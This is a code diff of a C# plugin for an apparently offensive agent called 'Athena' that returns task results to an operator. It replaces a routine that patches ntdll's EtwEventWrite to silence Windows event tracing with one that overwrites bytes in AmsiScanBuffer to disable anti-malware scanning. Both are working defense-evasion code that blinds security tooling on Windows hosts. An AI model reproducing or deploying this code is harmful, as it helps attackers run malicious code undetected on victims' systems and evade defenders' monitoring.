@@ -6,33 +6,28 @@ using System.Text;
 
 namespace Athena
 {
-    class Win32
-    {
-        [DllImport("kernel32")]
-        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-        [DllImport("kernel32")]
-        public static extern IntPtr LoadLibrary(string name);
-
-        [DllImport("kernel32")]
-        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-    }
     public static class Plugin
     {
-        //Credit to code goes to Adeam Chester @_xpn_ - https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/
-        //https://twitter.com/_xpn_
-
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
+        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
         public static ResponseResult Execute(Dictionary<string, object> args)
         {
             try
             {
-                if(PatchEtw(new byte[] { 0xc2, 0x14, 0x00 }))
+
+                if (Patch())
                 {
                     return new ResponseResult
                     {
                         completed = "true",
-                        user_output = "ETW Patched",
-                        task_id = (string)args["task-id"],
+                        user_output = "AMSI Patched",
+                        task_id = (string)args["task-id"], //task-id passed in from Athena
                     };
                 }
                 else
@@ -40,8 +35,8 @@ namespace Athena
                     return new ResponseResult
                     {
                         completed = "true",
-                        user_output = "Failed to patch ETW",
-                        task_id = (string)args["task-id"], 
+                        user_output = "Failed to patch AMSI",
+                        task_id = (string)args["task-id"], //task-id passed in from Athena
                         status = "error"
                     };
                 }
@@ -58,23 +53,35 @@ namespace Athena
                 };
             }
         }
-        private static bool PatchEtw(byte[] patch)
+        public static bool Patch()
         {
-            try
-            {
-                uint oldProtect;
-
-                var ntdll = Win32.LoadLibrary("ntdll.dll");
-                var etwEventSend = Win32.GetProcAddress(ntdll, "EtwEventWrite");
-
-                Win32.VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
-                Marshal.Copy(patch, 0, etwEventSend, patch.Length);
-                return true;
-            }
-            catch
+            IntPtr amsiDll = LoadLibrary("amsi.dll");
+            if (amsiDll == IntPtr.Zero)
             {
                 return false;
             }
+
+            IntPtr pAmsi = GetProcAddress(amsiDll, "AmsiScanBuffer");
+            if (pAmsi == IntPtr.Zero)
+            {
+                return false;
+            }
+
+            UIntPtr dwSize = (UIntPtr)4;
+            uint Zero = 0;
+
+            if (!VirtualProtect(pAmsi, dwSize, 0x40, out Zero))
+            {
+                return false;
+            }
+
+            Byte[] Patch = { 0x31, 0xff, 0x90 }; //The new patch opcode
+
+            IntPtr ptr = Marshal.AllocHGlobal(3);
+            Marshal.Copy(Patch, 0, ptr, 3);
+
+            MoveMemory(pAmsi + 0x001b, ptr, 3);
+            return true;
         }
     }
 
